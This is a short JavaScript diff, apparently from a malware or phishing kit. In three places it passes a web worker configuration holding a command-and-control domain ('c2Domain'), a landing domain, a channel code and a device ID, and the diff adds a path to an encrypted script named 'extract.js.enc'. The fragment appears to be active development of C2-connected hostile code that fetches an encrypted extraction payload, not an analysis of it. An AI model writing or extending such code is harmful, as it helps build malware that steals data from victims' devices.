@@ -339,7 +339,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     channelCode: __runtimeChannelSlug(),
                     c2Domain: __runtimeDomain(),
                     landingDomain: __runtimeDomain(),
-                    deviceId: __runtimeDeviceId()
+                    deviceId: __runtimeDeviceId(),
+                    extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                 });
             }
@@ -370,7 +371,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         SERVER_LOG,
                         channelCode: __runtimeChannelSlug(),
                         c2Domain: __runtimeDomain(),
-                        landingDomain: __runtimeDomain()
+                        landingDomain: __runtimeDomain(),
+                        extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                         });
                             }
@@ -392,7 +394,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 SERVER_LOG,
                 channelCode: __runtimeChannelSlug(),
                 c2Domain: __runtimeDomain(),
-                landingDomain: __runtimeDomain()
+                landingDomain: __runtimeDomain(),
+                extractPath: new URL('extract.js.enc', localHost + '/').pathname
             });
             });
                     }
